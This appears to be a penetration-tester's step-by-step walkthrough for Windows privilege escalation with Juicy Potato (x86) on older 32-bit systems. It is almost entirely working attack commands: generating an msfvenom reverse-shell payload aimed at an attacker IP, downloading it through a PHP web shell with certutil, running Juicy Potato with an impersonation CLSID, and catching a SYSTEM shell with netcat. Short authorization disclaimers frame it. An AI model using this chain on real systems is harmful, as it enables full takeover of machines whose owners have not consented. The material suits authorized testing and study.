# Windows Privilege Escalation – Juicy Potato (x86)

This document describes using **Juicy Potato (x86)** to escalate privileges from a service account to **NT AUTHORITY\SYSTEM** on **32-bit Windows systems**.

⚠️ For educational and authorized testing purposes only.

---

## Supported Windows Versions

Juicy Potato works on **older Windows versions** where DCOM token impersonation is possible:

- Windows 7 (32-bit)
- Windows Server 2008 / 2008 R2 (32-bit)
- Windows Server 2012 (older builds)

❌ Not suitable for modern Windows 10 / Server 2016+  
❌ Not suitable for 64-bit-only environments when using x86 binaries

---

## Preconditions (MUST CHECK)

### 1️⃣ Verify Windows Architecture
```cmd
systeminfo | findstr /i "System Type"
```

Expected:
```
System Type: X86-based PC
```

---

### 2️⃣ Verify Required Privilege
Juicy Potato requires **SeImpersonatePrivilege** OR **SeAssignPrimaryTokenPrivilege**.

```cmd
whoami /priv
```

Must include:
```
SeImpersonatePrivilege   Enabled
```

---

### 3️⃣ Verify Juicy Potato Binary Architecture
Check on attacker (Kali/Base) machine:
```bash
file Juicy.Potato.x86.exe
```

Expected:
```
PE32 executable (Intel 80386)
```

---

## Payload Preparation (32-bit)

Generate a 32-bit reverse shell payload:

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=1338 -f exe -o msf_32_rev_shell.exe
```

Host the payload on attacker machine:
```bash
python3 -m http.server 80
```

---

## Upload Payload to Target (Windows)

```text
cmd_shell.php?cmd=certutil.exe -urlcache -f http://192.168.45.189/msf_32_rev_shell.exe msf_32_rev_shell.exe
```

---

## Juicy Potato Exploitation

### Command Used
```cmd
Juicy.Potato.x86.exe -t * -p msf_32_rev_shell.exe -l 1338 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
```

### Argument Explanation
- `-t *` → Try both token creation methods
- `-p` → Program to execute as SYSTEM
- `-l 1338` → COM listener port (local only, NOT the reverse shell port)
- `-c` → CLSID vulnerable to impersonation

⚠️ **Note:**  
`-l` (COM port) and `LPORT` (reverse shell port) **can be the same or different**.  
They serve **different purposes**.

---

## Listener on Attacker Machine

```bash
nc -nlvp 1338
```

---

## Expected Result

- Juicy Potato reports successful token impersonation
- Reverse shell connects back
- Shell runs as:

```cmd
NT AUTHORITY\SYSTEM
```

Verify:
```cmd
whoami
```

---

## Common Issues

### ❌ No shell but Juicy Potato says OK
- Firewall blocking outbound connection
- Wrong LHOST
- Antivirus blocking payload
- Payload architecture mismatch (x64 payload on x86 OS)

---

## Summary

Juicy Potato abuses **SeImpersonatePrivilege** via DCOM to spawn a SYSTEM process.  
It is effective only on **older, vulnerable Windows systems**, especially **32-bit environments**.

---

## Disclaimer

Use this technique only on systems you own or have explicit authorization to test.

